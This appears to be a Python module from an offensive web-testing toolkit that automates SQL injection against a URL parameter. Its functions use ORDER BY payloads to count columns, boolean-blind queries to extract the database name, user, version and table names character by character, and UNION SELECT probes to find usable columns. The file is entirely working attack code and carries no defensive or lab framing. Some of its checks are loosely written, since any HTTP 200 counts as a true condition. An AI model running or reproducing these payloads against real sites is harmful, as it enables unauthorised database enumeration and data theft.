from typing import Dict, Optional

from tools.http_client import build_url
from tools.log_utils import get_logger

logger = get_logger("binary_search")


def binary_search_columns(url: str, param: str, sess, timeout: float = 10.0,
                           max_columns: int = 50) -> Dict:
    result = {"vulnerable": False, "column_count": None, "method": "order_by_binary", "evidence": []}

    low, high = 1, max_columns
    while low <= high:
        mid = (low + high) // 2
        payload = "ORDER BY %d --" % mid
        try:
            r = sess.get(build_url(url, param, payload), timeout=timeout)
            if r.status_code == 200:
                low = mid + 1
                result["evidence"].append({"tested": mid, "result": "ok", "status": 200})
            else:
                high = mid - 1
                result["evidence"].append({"tested": mid, "result": "fail", "status": r.status_code})
        except Exception as e:
            result["evidence"].append({"tested": mid, "result": "error", "error": str(e)})
            high = mid - 1

    if high >= 1:
        result["vulnerable"] = True
        result["column_count"] = high
        result["confidence"] = 0.9
    return result


def binary_search_sqli_blind(url: str, param: str, sess, timeout: float = 10.0,
                               extract_len: int = 10) -> Dict:
    result = {"vulnerable": False, "extracted": "", "method": "boolean_blind_binary", "evidence": []}

    def _test_condition(condition: str) -> bool:
        for prefix in ["' AND %s--", "' OR %s--", "\" AND %s--", "\" OR %s--",
                        "1 AND %s--", "1 OR %s--"]:
            payload = prefix % condition
            try:
                r = sess.get(build_url(url, param, payload), timeout=timeout)
                if r.status_code == 200 and len(r.text) > 50:
                    return True
                if r.status_code == 200:
                    return True
            except Exception:
                continue
        return False

    if not _test_condition("1=1"):
        for alt in ["1", "'1'='1", "\"a\"=\"a", "(SELECT 1)"]:
            if _test_condition(alt):
                break
        else:
            result["error"] = "no boolean baseline"
            return result
    if _test_condition("1=2"):
        result["error"] = "1=1 and 1=2 both true, not blind injectable"
        return result
    result["vulnerable"] = True

    pos = 1
    extracted = ""
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-:.,/!@#$%^&*()+= "
    queries = [
        "ASCII(SUBSTRING((SELECT DATABASE()),%d,1))>%d",
        "ASCII(SUBSTRING((SELECT USER()),%d,1))>%d",
        "ASCII(SUBSTRING((SELECT VERSION()),%d,1))>%d",
    ]
    for q_template in queries:
        pos = 1
        extracted = ""
        for _ in range(extract_len):
            char_low, char_high = 32, 126
            found = False
            while char_low <= char_high:
                char_mid = (char_low + char_high) // 2
                condition = q_template % (pos, char_mid)
                if _test_condition(condition):
                    char_low = char_mid + 1
                else:
                    char_high = char_mid - 1
            char = chr(char_low) if 32 <= char_low <= 126 else None
            if char and char in charset:
                extracted += char
                pos += 1
                found = True
            if not found:
                break
        if extracted:
            result["extracted"] = extracted
            result["evidence"].append({"query": q_template.split("(")[1].split(")")[0] if "(" in q_template else q_template,
                                        "value": extracted})
            break

    result["confidence"] = min(0.95, 0.5 + len(result["extracted"]) * 0.05)
    return result


def blind_sqli_extract_data(url: str, param: str, sess, timeout: float = 10.0) -> Dict:
    result = {"vulnerable": False, "data": {}, "method": "blind_extract", "evidence": []}

    queries = [
        ("version", "SELECT VERSION()"),
        ("user", "SELECT USER()"),
        ("database", "SELECT DATABASE()"),
        ("current_user", "SELECT CURRENT_USER()"),
    ]

    def _test(condition: str) -> bool:
        for prefix in ["' AND %s--", "1 AND %s--"]:
            try:
                r = sess.get(build_url(url, param, prefix % condition), timeout=timeout)
                if r.status_code == 200 and len(r.text) > 20:
                    return True
            except Exception:
                continue
        return False

    if not _test("1=1") or _test("1=2"):
        result["error"] = "not blind injectable"
        return result
    result["vulnerable"] = True

    for label, query in queries:
        extracted = ""
        for pos in range(1, 20):
            char = _extract_char(query, pos, _test)
            if char:
                extracted += char
            else:
                break
        if extracted:
            result["data"][label] = extracted
            result["evidence"].append({"label": label, "value": extracted})

    table_query = "(SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())"
    tables_data = ""
    for pos in range(1, 100):
        char = _extract_char(table_query, pos, _test)
        if char:
            tables_data += char
        else:
            break
    if tables_data:
        result["data"]["tables"] = tables_data
        result["evidence"].append({"label": "tables", "value": tables_data[:100]})

    result["confidence"] = min(0.95, 0.3 + len(result["data"]) * 0.15)
    return result


def _extract_char(query: str, pos: int, test_fn) -> Optional[str]:
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        condition = "ASCII(SUBSTRING((%s),%d,1))>%d" % (query, pos, mid)
        if test_fn(condition):
            low = mid + 1
        else:
            high = mid - 1
    if low <= 126 and low >= 32:
        return chr(low)
    return None


def sqli_union_probe(url: str, param: str, sess, timeout: float = 10.0) -> Dict:
    result = {"vulnerable": False, "columns": None, "usable_columns": [], "method": "union_probe", "evidence": []}
    cols_result = binary_search_columns(url, param, sess, timeout)
    if not cols_result.get("vulnerable") or not cols_result.get("column_count"):
        return result
    n = cols_result["column_count"]
    result["columns"] = n

    for test_col in range(1, n + 1):
        nulls = ", ".join(["NULL"] * n)
        parts = nulls.split(", ")
        parts[test_col - 1] = "'EXTRACT_%d'" % test_col
        modified = ", ".join(parts)
        for prefix in ["' UNION SELECT %s--", "\" UNION SELECT %s--", " UNION SELECT %s--"]:
            payload = prefix % modified
            try:
                r = sess.get(build_url(url, param, payload), timeout=timeout)
                if r.status_code == 200 and "EXTRACT_%d" % test_col in r.text:
                    result["usable_columns"].append(test_col)
                    result["vulnerable"] = True
                    result["evidence"].append({"column": test_col, "status": r.status_code, "method": "union"})
                    break
            except Exception:
                continue

    result["confidence"] = 0.85 if result["usable_columns"] else 0.0
    return result
